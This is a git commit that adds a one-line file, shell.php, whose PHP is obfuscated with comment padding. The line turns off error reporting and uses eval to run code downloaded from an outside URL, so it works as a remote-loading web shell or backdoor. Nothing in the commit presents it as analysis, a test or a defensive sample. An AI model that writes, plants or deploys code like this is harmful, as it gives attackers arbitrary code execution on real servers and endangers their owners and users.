93265dd007c812b256586ef1b78cc05489307d20
B4R3T <barbarheng@gmail.com>
2025-11-13 17:44:08 +0700

    Create shell.php

---
+++ shell.php
@@ -0,0 +1,1 @@
+<?=/****/@/*55555*/null; /******/@/*55555*/error_reporting(0);/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://bujang.online/raw/31Rb0FKK9A"))/******/ /*By Lanciau:v*/?>
